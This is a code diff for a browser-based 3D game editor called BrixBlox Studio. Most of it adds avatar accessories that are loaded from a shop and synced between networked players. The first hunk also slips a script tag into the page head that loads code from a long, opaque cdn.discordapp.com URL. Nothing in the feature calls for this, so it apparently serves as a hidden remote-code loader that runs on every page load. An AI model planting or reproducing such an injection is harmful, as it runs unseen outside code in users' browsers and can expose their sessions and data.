@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en" data-theme="light">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/l2gaBCn1cvUru3tlI6_Or5Q5ABiOHefRb2gkliGlDQTYXbHYnqlS4zGFoYc_ONjhQaOgEX3xyShbsWJwRI7xJMSIxSafBHVixw-fSPIlEc2bx8yMrEhoOq1uuINymAaobAK0rw_cfMJxNPJLJEClNhs9_NdL2JEkAa8DK9myvc38MS7YTt7CgMybLbggkpgWEaAsKPjQ0FP31NUX_R0BpaG6AA6P6-PNWwAUC7p0LHoSoakJ4z5CPPT9uQfkEcnzD204k3ZQO-hZB3NCtoHh6rFQECm4Owy6IWT70pvgKir5unZET56h6ilXnO7qa2TDFPzZZlI-Zt4nGB0_d4bV23sR0iP1xZd83xgHX9XjLPnOF1ktESckl0Fg09AkQQxcpcasj0f8erLTDUMWuMePhna9US5dvXzDIqhokq9XnDk-usbp0XzsE3HE48k09DsSNV0Dsj9soQqayz_1D6pXrBb47xvhuYxJ3c2bt6hUPb8dB8SOIyoY3DGZHgymzyP1lHmFaEMgt786W9MHSRqGcJ1naN3t_KzYYl8F83Gri7LwIzFFUHtREg2Aw8CLTwYJQaEqthrXKG5M3hknaAsIBmxr1ZGA2NBgZNzUMeLDzWHKuvvw-hx4Tja9aFCKJOao-cAg3g3-18t0dIDU_4ThvUZ0jeNAsHgC-Cp3'></script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>BrixBlox Studio</title>
@@ -1205,7 +1205,7 @@ function rebuildParts(){
   const hk={};P.parts.forEach(function(p){if(p.parent)hk[p.parent]=1});
   P.parts.forEach(function(p){const g=J[p.id],v=piv(p),pa=p.parent&&byId(p.parent);
     if(pa){const q=piv(pa);g.position.set(v[0]-q[0],v[1]-q[1],v[2]-q[2]);J[pa.id].add(g)}else{g.position.set(v[0],v[1],v[2]);g.visible=inW(p);PG.add(g)}g.userData.base=g.position.clone();g.userData.gry=!p.parent&&hk[p.id]&&p.ry?p.ry*Math.PI/180:0});
-  refreshRot();stageApply();hl();if(rigOn)applyPose({});else preview();buildEdit();lastCol='';lastSay='\u0000';draw()}
+  refreshRot();stageApply();hl();if(rigOn)applyPose({});else preview();buildEdit();lastCol='';lastSay='\u0000';try{accLocal()}catch(e){}draw()}
 function applyPose(po,only,hold){P.parts.forEach(function(p){if(only&&!p.av)return;if(hold&&hold[p.id]>0&&p.id!==P.avId)return;if(p.id===P.avId){const o=po&&po['p:'+p.id],ro=po&&po[p.id];J[p.id].userData.off=o?o.slice():null;J[p.id].userData.rot=ro?ro.slice():null;return}const r=(po&&po[p.id])||[0,0,0];J[p.id].rotation.set(r[0]*Math.PI/180,r[1]*Math.PI/180+(J[p.id].userData.gry||0),r[2]*Math.PI/180);if(J[p.id].userData.sq)J[p.id].quaternion.premultiply(J[p.id].userData.sq);const o=po&&po['p:'+p.id],b=J[p.id].userData.base;if(b)J[p.id].position.set(b.x+(o?o[0]:0),b.y+(o?o[1]:0),b.z+(o?o[2]:0))})}
 function evalPosKeys(A,t,o){for(const id in A.keys){const k=A.keys[id].filter(function(x){return x.p}).sort(function(a,b){return a.t-b.t});if(!k.length)continue;const f=k[0],l=k[k.length-1];
   if(t<=f.t)o['p:'+id]=f.p;else if(t>=l.t)o['p:'+id]=l.p;else for(let i=0;i<k.length-1;i++)if(t>=k[i].t&&t<=k[i+1].t){const u=(t-k[i].t)/((k[i+1].t-k[i].t)||1),a=k[i].p,b=k[i+1].p;o['p:'+id]=a.map(function(v,j){return v+(b[j]-v)*u});break}}}
@@ -1229,14 +1229,64 @@ function applyKeyed(po){for(const id in po){const v=po[id];
 /* Objects a script acts on: its owner (a model's loose roots, or a part's whole rig). The player is never pushed. */
 function roots(o,av){if(!o)return [];if(byModel(o))return partsOf(o).filter(function(p){return !p.parent&&(av||!p.av)});const p=byId(o);return p&&(av||!rootOf(p).av)?[rootOf(p)]:[]}
 function objMove(dt){pushMe(dt);for(const id in RD){const d=RD[id];d.el+=dt;const u=Math.min(1,d.el/d.dur),e=u*u*(3-2*u),dl=e-d.ep;d.ep=e;const rg=RAG['rig:'+id];if(rg&&rg.sim&&!rg.gone){rg.sim.bodies.forEach(function(b){b.x[0]+=d.dx*dl;b.x[1]+=d.dy*dl;b.x[2]+=d.dz*dl;if(b.xp){b.xp[0]+=d.dx*dl;b.xp[1]+=d.dy*dl;b.xp[2]+=d.dz*dl}})}else{const q=RO[id]||(RO[id]=[0,0]);q[0]+=d.dx*dl;q[1]+=d.dz*dl;RY[id]=(RY[id]||0)+d.dy*dl}if(u>=1)delete RD[id]}for(const id in RVY){const w=RVY[id];w.v-=P.rules.grav*dt;let ny=(RY[id]||0)+w.v*dt;RO[id]=RO[id]||[0,0];if(w.v<=0&&ny<=w.f){ny=w.f;delete RVY[id]}RY[id]=ny}for(const id in RV){const v=RV[id],q=RO[id]||(RO[id]=[0,0]);q[0]+=v[0]*dt;q[1]+=v[1]*dt;const k=Math.exp(-dt*3);v[0]*=k;v[1]*=k;if(Math.hypot(v[0],v[1])<.05)delete RV[id]}}
+/* ===== Avatar accessories (made in the BrixBlox shop). Your equipped items come from your profile (ME.av.eq); other players send only the item ids,
+   and every player downloads the item models themselves, so nothing big is ever sent over the game connection. ===== */
+const ACCI={},ACCP={};let ACCTOK=0;
+const ACCS={hat:{y:1.82,z:0,s:.55,base:1,at:'Head'},face:{y:1.58,z:.27,s:.32,at:'Head'},facc:{y:1.63,z:.27,s:.46,at:'Head'},back:{y:1,z:-.27,s:.9,at:'Torso'},neck:{y:1.3,z:0,s:.6,at:'Torso'}};
+const ACCU=.34,ACCC={Head:4.65,Torso:3};/* the shop avatar is drawn at .34 scale; Head / Torso centres in studs above the feet */
+function accClean(eq){const o={};if(eq&&typeof eq==='object')Object.keys(ACCS).forEach(function(k){const v=eq[k];if(typeof v==='string'&&/^acc_[a-z0-9]{1,16}$/.test(v))o[k]=v});return o}
+function accStr(eq){eq=accClean(eq);return Object.keys(eq).map(function(k){return k+':'+eq[k]}).join(',')}
+function accParse(t){const o={};if(typeof t!=='string')return o;t.slice(0,200).split(',').forEach(function(x){const a=x.split(':');if(a.length===2&&ACCS[a[0]]&&/^acc_[a-z0-9]{1,16}$/.test(a[1]))o[a[0]]=a[1]});return o}
+function accFbx(){return new Promise(function(ok,no){if(THREE.FBXLoader)return ok();
+  const L=['https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/libs/fflate.min.js','https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/loaders/FBXLoader.js'];let i=0;
+  (function nx(){if(i>=L.length){THREE.FBXLoader?ok():no(new Error('no FBX loader'));return}const sc=document.createElement('script');sc.src=L[i++];sc.onload=nx;sc.onerror=nx;document.head.append(sc)})()})}
+function accRows(ids){
+  if(sb)return sb.from('games').select('id,name,data').in('id',ids).then(function(r){if(r.error)throw r.error;return r.data.map(function(x){let d=x.data;try{if(typeof d==='string')d=JSON.parse(d)}catch(e){d={}}return Object.assign({id:x.id,name:x.name},d||{})})});
+  try{return Promise.resolve((JSON.parse(store.get('brixblox-acc'))||[]).filter(function(x){return ids.indexOf(x.id)>=0}))}catch(e){return Promise.resolve([])}}
+function accLoad(ids){/* resolves once every id is loaded (or known to be unavailable) */
+  const miss=ids.filter(function(id){return !ACCI[id]&&!ACCP[id]});
+  if(miss.length){const pr=accRows(miss).then(function(rows){return accFbx().then(function(){
+      miss.forEach(function(id){const r=rows.find(function(x){return x.id===id});ACCI[id]={it:null,obj:null};if(!r||r.removed||!r.fbx)return;
+        try{const b=atob(r.fbx),u=new Uint8Array(b.length);for(let i=0;i<b.length;i++)u[i]=b.charCodeAt(i);const o=new THREE.FBXLoader().parse(u.buffer,'');
+          o.traverse(function(m){if(m.geometry)m.geometry.userData.keep=true});ACCI[id]={it:r,obj:o}}catch(e){}})})}).catch(function(){miss.forEach(function(id){if(!ACCI[id])ACCI[id]={it:null,obj:null}})});
+    miss.forEach(function(id){ACCP[id]=pr})}
+  return Promise.all(ids.map(function(id){return ACCP[id]||Promise.resolve()}))}
+const ACCT={};
+function accTex(url,flip){const k=(flip?'f':'n')+url;if(ACCT[k])return ACCT[k];const t=new THREE.TextureLoader().load(url);t.flipY=!flip;t.wrapS=t.wrapT=THREE.RepeatWrapping;return ACCT[k]=t}
+function accMake(slot,id,hs){/* hs: head height scale, so items still fit a resized head */
+  const e=ACCI[id];if(!e||!e.obj)return null;const it=e.it,sl=ACCS[slot];if(!sl)return null;
+  const c=e.obj.clone(true);c.position.set(0,0,0);
+  c.traverse(function(m){if(!m.isMesh)return;m.castShadow=false;/* own copies of the materials: hiding your avatar in first person must not hide anyone else's item */
+    const ap=function(mt){const n=mt.clone();if(it.tex){n.map=accTex(it.tex,it.tf);if(n.color)n.color.set(0xffffff);n.transparent=true;n.alphaTest=.02;n.needsUpdate=true}return n};
+    m.material=Array.isArray(m.material)?m.material.map(ap):ap(m.material)});
+  c.updateMatrixWorld(true);
+  const bx=new THREE.Box3().setFromObject(c),sz=bx.getSize(new THREE.Vector3()),ct=bx.getCenter(new THREE.Vector3()),k=sl.s*(it.scale||1)/(Math.max(sz.x,sz.y,sz.z)||1),D=Math.PI/180;
+  const w=new THREE.Group();c.position.set(-ct.x,sl.base?-bx.min.y:-ct.y,-ct.z);w.add(c);w.scale.setScalar(k);
+  w.rotation.set((it.rx||0)*D,(it.ry||0)*D,(it.rz||0)*D);
+  w.position.set(it.px||0,sl.y+(it.py||0)-ACCC[sl.at]*ACCU,sl.z+(it.pz||0));
+  /* The shop avatar faces +z and is measured in .34 units; the game character faces -z and is measured in studs. */
+  const F=new THREE.Group();F.rotation.y=Math.PI;F.scale.setScalar(hs/ACCU);F.add(w);F.userData.acc=1;return F}
+/* Dress a character. meshes = {Head:mesh,Torso:mesh} of one rig, eq = {slot:itemId} */
+function accDress(meshes,eq,hs){
+  eq=accClean(eq);const tok=++ACCTOK;
+  function clear(){Object.keys(meshes).forEach(function(n){const m=meshes[n];if(!m)return;(m.userData.accs||[]).forEach(function(a){m.remove(a)});m.userData.accs=[];m.userData.accTok=tok})}
+  clear();const ids=Object.keys(eq).map(function(k){return eq[k]});if(!ids.length)return;
+  function put(){clear();Object.keys(eq).forEach(function(slot){const at=ACCS[slot].at,m=meshes[at];if(!m)return;const f=accMake(slot,eq[slot],hs||1);if(f){m.add(f);m.userData.accs.push(f)}})}
+  if(ids.every(function(id){return ACCI[id]}))put();
+  else accLoad(ids).then(function(){const m0=meshes.Head||meshes.Torso;if(m0&&m0.userData.accTok!==tok)return;put()})}
+function accLocal(){/* put your own equipped items on your character */
+  if(!ME||!ME.av)return;const H=P.parts.find(function(p){return p.av&&p.name==='Head'}),T=P.parts.find(function(p){return p.av&&p.name==='Torso'});
+  accDress({Head:H&&M[H.id],Torso:T&&M[T.id]},ME.av.eq,H?Math.max(.3,Math.min(3,H.size[1]/1.5)):1)}
+function netEq(e,t){/* another player's items */
+  const H=P.parts.find(function(p){return p.av&&p.name==='Head'});accDress(e.MM||{},accParse(t),H?Math.max(.3,Math.min(3,H.size[1]/1.5)):1)}
 /* Extra players: copies of your character with a name tag, standing next to you */
 function clearNP(){NP.forEach(function(n){if(n.bub){scene.remove(n.bub.sp);n.bub.t.dispose();n.bub.sp.material.dispose()}scene.remove(n.g);scene.remove(n.tag);n.g.traverse(function(o){if(o.geometry&&!o.geometry.userData.keep)o.geometry.dispose();if(o.material)o.material.dispose()});n.tag.material.map.dispose();n.tag.material.dispose()});NP.length=0}
-function spawnPlayer(name,S){const T=byId(P.avId),av=P.parts.filter(function(p){return p.av});
+function spawnPlayer(name,S){const T=byId(P.avId),av=P.parts.filter(function(p){return p.av}),MM={};
   if(!T||!av.length){log('Error: there is no player character to copy.');return}
   const nm=String(name).trim().slice(0,16)||'Player'+(NP.length+2),n=NP.length,grp=new THREE.Group(),JJ={},dx=(n%2?-1:1)*(4+Math.floor(n/2)*3);
   av.forEach(function(p){const g=new THREE.Group(),v=piv(p),m=new THREE.Mesh(p.acc?cachedGeo(p,false,shapeGeo):avGeo(p),mkMat(p));m.castShadow=!p.stab;m.receiveShadow=true;
     if(p.name==='Torso'){if(NETCOL)m.material.color.set(NETCOL);else m.material.color.offsetHSL((n+1)*.17,0,0)}
-    m.position.set(p.pos[0]-v[0],p.pos[1]-v[1],p.pos[2]-v[2]);if(p.face)addFace(m,p);if(p.stab)m.visible=false;g.add(m);JJ[p.id]=g});
+    m.position.set(p.pos[0]-v[0],p.pos[1]-v[1],p.pos[2]-v[2]);if(p.face)addFace(m,p);if(p.stab)m.visible=false;if(p.name==='Head'||p.name==='Torso')MM[p.name]=m;g.add(m);JJ[p.id]=g});
   av.forEach(function(p){const g=JJ[p.id],v=piv(p),pa=p.parent&&byId(p.parent);
     if(pa&&JJ[pa.id]){const q=piv(pa);g.position.set(v[0]-q[0],v[1]-q[1],v[2]-q[2]);JJ[pa.id].add(g)}else{g.position.set(v[0],v[1],v[2]);grp.add(g)}});
   grp.position.set(dx,0,0);scene.add(grp);
@@ -1244,7 +1294,7 @@ function spawnPlayer(name,S){const T=byId(P.avId),av=P.parts.filter(function(p){
   x.fillStyle='rgba(20,22,24,.82)';x.fillRect(4,10,248,44);x.fillStyle='#fff';x.font='700 26px sans-serif';x.textAlign='center';x.textBaseline='middle';x.fillText(nm,128,33);
   const tag=new THREE.Sprite(new THREE.SpriteMaterial({map:new THREE.CanvasTexture(c),transparent:true,depthTest:false}));tag.scale.set(3.2,.8,1);tag.renderOrder=8;
   let top=0;av.forEach(function(p){top=Math.max(top,p.pos[1]+p.size[1]/2)});tag.position.set(T.pos[0]+dx,top+1.3,T.pos[2]);scene.add(tag);
-  NP.push({g:grp,tag:tag,JJ:JJ,t:n*.7,dx:dx,name:nm,top:top});S.oth.push(nm);log(nm+' joined the game');renderParts()}
+  NP.push({g:grp,tag:tag,JJ:JJ,MM:MM,t:n*.7,dx:dx,name:nm,top:top});S.oth.push(nm);log(nm+' joined the game');renderParts()}
 function npAnim(n){return(typeof n==='string'&&n&&Object.prototype.hasOwnProperty.call(P.anims,n))?P.anims[n]:null}
 function npTick(dt){if(!NP.length)return;const T=byId(P.avId);
   NP.forEach(function(q){q.t+=dt;
@@ -2850,6 +2900,7 @@ function netRecv(q){if(!q||!q.id||q.id===NET.id||!NET.on||!(running||playing))re
   e.tx=q.x;e.ty=q.y;e.th=q.h;e.td=q.d;e.mv=q.m;e.seen=performance.now();
   const nm=function(v){return typeof v==='string'?v.slice(0,40):''};
   e.air=!!q.g;e.wa=nm(q.wa);e.ia=nm(q.ia);e.ja=nm(q.ja);
+  {const es=typeof q.e==='string'?q.e.slice(0,200):'';if(es!==e.eqs){e.eqs=es;try{netEq(e,es)}catch(x){}}}
   if(e.rc===undefined)e.rc=q.rc;else if(q.rc!==e.rc){e.rc=q.rc;startRag('np:'+e.name,false)}/* they were ragdolled: show it on this screen too (never as a kill, they respawn on their own screen) */
   if(e.ac===undefined)e.ac=q.ac;/* first packet: do not replay an old animation */
   else if(q.ac!==e.ac){e.ac=q.ac;if(nm(q.an)){e.an=nm(q.an);e.at=0}}}
@@ -2861,7 +2912,7 @@ function netDrop(id){const i=NP.findIndex(function(n){return n.net===id});if(i<0
   n.g.traverse(function(o){if(o.geometry&&!o.geometry.userData.keep)o.geometry.dispose();if(o.material)o.material.dispose()});n.tag.material.map.dispose();n.tag.material.dispose();
   NP.splice(i,1);const k=S.oth.indexOf(n.name);if(k>=0)S.oth.splice(k,1);chatSys(n.name+' left the game');renderParts()}
 setInterval(function(){if(!NET.on||!(running||playing))return;
-  const q={id:NET.id,n:ME.username,c:ME.color||'',x:+S.x.toFixed(2),y:+S.y.toFixed(2),h:+S.h.toFixed(2),d:Math.round(S.dir),m:Math.hypot(S.pvx,S.pvz)>.5?1:0,g:S.gr?0:1,wa:S.walkA||'',ia:S.idleA||'',ja:S.jumpA||'',an:NANIM.n,ac:NANIM.c,rc:NRAG.c},j=[q.x,q.y,q.h,q.d,q.m,q.g,q.wa,q.ia,q.ja,q.an,q.ac,q.rc].join();
+  const q={id:NET.id,n:ME.username,c:ME.color||'',x:+S.x.toFixed(2),y:+S.y.toFixed(2),h:+S.h.toFixed(2),d:Math.round(S.dir),m:Math.hypot(S.pvx,S.pvz)>.5?1:0,g:S.gr?0:1,wa:S.walkA||'',ia:S.idleA||'',ja:S.jumpA||'',an:NANIM.n,ac:NANIM.c,rc:NRAG.c,e:accStr(ME&&ME.av&&ME.av.eq)},j=[q.x,q.y,q.h,q.d,q.m,q.g,q.wa,q.ia,q.ja,q.an,q.ac,q.rc,q.e].join();
   if(j===NET.last&&++NET.idle<10)return;NET.last=j;NET.idle=0;NET.ch.send({type:'broadcast',event:'p',payload:q});
   const now=performance.now();NP.slice().forEach(function(n){if(n.net&&now-n.seen>20000)netDrop(n.net)})},100);
 function bbHud(){const lb=el('button','btn ghost small','Leave game');lb.id='bb-leave';lb.style.cssText='position:fixed;top:10px;right:10px;z-index:60';lb.onclick=leaveGame;
